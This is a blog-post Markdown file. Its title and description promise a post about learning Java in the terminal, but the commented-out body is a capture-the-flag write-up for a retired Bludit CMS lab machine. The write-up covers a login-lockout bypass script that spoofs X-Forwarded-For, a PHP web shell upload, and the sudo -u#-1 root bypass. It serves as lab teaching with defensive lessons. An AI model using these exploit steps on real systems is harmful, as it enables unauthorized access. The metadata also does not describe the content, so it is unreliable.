---
layout: '../../layouts/BlogPost.astro'
title: "Why I’m Learning Java Through the Terminal (The Hard Way)"
date: "Feb 1, 2026"
tag: "Learning"
readTime: "5 min"
description: "Learning Java in the terminal trains you to read errors carefully, reason instead of guessing, and fix root causes rather than symptoms. This is how real engineers think."
---

[//]: # ()
[//]: # (## Machine info)

[//]: # ()
[//]: # (- **OS**: Linux &#40;Ubuntu&#41;)

[//]: # (- **Difficulty**: Easy)

[//]: # (- **Skills**: Web enumeration, CMS exploitation, sudo privesc)

[//]: # ()
[//]: # (## Recon)

[//]: # ()
[//]: # (Start with the usual nmap scan:)

[//]: # ()
[//]: # (```bash)

[//]: # (nmap -sCV -p- --min-rate 5000 10.10.10.191)

[//]: # (```)

[//]: # ()
[//]: # (Only port 80 is open. Navigating to the IP reveals a Bludit CMS instance. Version fingerprinting via the source and `/bl-plugins/` puts this at Bludit **3.9.2**.)

[//]: # ()
[//]: # (## Bruteforce bypass)

[//]: # ()
[//]: # (Bludit 3.9.2 has a brute-force protection that blocks IPs after a configurable number of failed logins. The protection reads the client IP from the `X-Forwarded-For` header — but never validates it. By rotating this header value on each request, we bypass the lockout entirely.)

[//]: # ()
[//]: # (```python)

[//]: # (import requests, re)

[//]: # ()
[//]: # (target = "http://10.10.10.191/admin/")

[//]: # (wordlist = open&#40;"rockyou.txt"&#41;.read&#40;&#41;.splitlines&#40;&#41;)

[//]: # ()
[//]: # (for i, pwd in enumerate&#40;wordlist&#41;:)

[//]: # (    headers = {"X-Forwarded-For": f"10.0.0.{i % 256}"})

[//]: # (    r = requests.post&#40;target, data={"tokenCSRF": get_csrf&#40;target&#41;, "username": "admin", "password": pwd}, headers=headers, allow_redirects=False&#41;)

[//]: # (    if "location" in r.headers and "dashboard" in r.headers["location"]:)

[//]: # (        print&#40;f"[+] Password found: {pwd}"&#41;)

[//]: # (        break)

[//]: # (```)

[//]: # ()
[//]: # (> The key insight: rotate the spoofed IP every request so each attempt appears to come from a fresh source.)

[//]: # ()
[//]: # (## RCE via plugin upload)

[//]: # ()
[//]: # (Once authenticated, navigate to **Plugins → File Uploader**. Bludit checks the file extension but not the MIME type or content. Upload a `.jpg` file containing a PHP web shell:)

[//]: # ()
[//]: # (```php)

[//]: # (<?php system&#40;$_GET['cmd']&#41;; ?>)

[//]: # (```)

[//]: # ()
[//]: # (Then access it directly at `/bl-content/uploads/pages/shell.jpg?cmd=id`. We get RCE as `www-data`.)

[//]: # ()
[//]: # (## Privilege escalation)

[//]: # ()
[//]: # (Enumerate sudo permissions:)

[//]: # ()
[//]: # (```bash)

[//]: # (sudo -l)

[//]: # (# &#40;ALL, !root&#41; NOPASSWD: /bin/bash)

[//]: # (```)

[//]: # ()
[//]: # (This is **CVE-2019-14287**. When `sudo` is configured with `!root`, a user ID of `-1` bypasses the restriction:)

[//]: # ()
[//]: # (```bash)

[//]: # (sudo -u#-1 /bin/bash)

[//]: # (# root@blunder:/#)

[//]: # (```)

[//]: # ()
[//]: # (## Lessons learned)

[//]: # ()
[//]: # (1. Never trust client-supplied headers for rate limiting or IP-based logic.)

[//]: # (2. File upload validation must check content, not just extension.)

[//]: # (3. Always check sudo version — pre-1.8.28 is vulnerable to the `-u#-1` bypass.)

[//]: # ()
[//]: # (---)

[//]: # ()
[//]: # (*Rooted in ~2 hours. Machine retired, so this write-up is safe to publish.*)
